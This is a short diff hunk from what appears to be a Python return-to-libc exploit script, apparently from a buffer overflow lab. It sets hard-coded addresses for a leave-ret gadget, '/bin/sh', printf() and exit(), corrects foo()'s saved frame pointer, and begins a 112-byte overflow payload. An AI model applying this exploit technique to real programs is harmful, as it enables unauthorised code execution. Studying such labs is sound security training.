@@ -8,7 +8,7 @@ leaveret    = 0x08048580   # Address of leaveret
 sh_addr     = 0xbffffef0   # Address of "/bin/sh"
 printf_addr = 0xb7e51670   # Address of printf()
 exit_addr   = 0xb7e369d0   # Address of exit()
-ebp_foo     = 0xbfffeb28   # foo()'s frame pointer
+ebp_foo     = 0xbfffeb08   # foo()'s frame pointer
 
 content   = bytearray(0xaa for i in range(112))
 
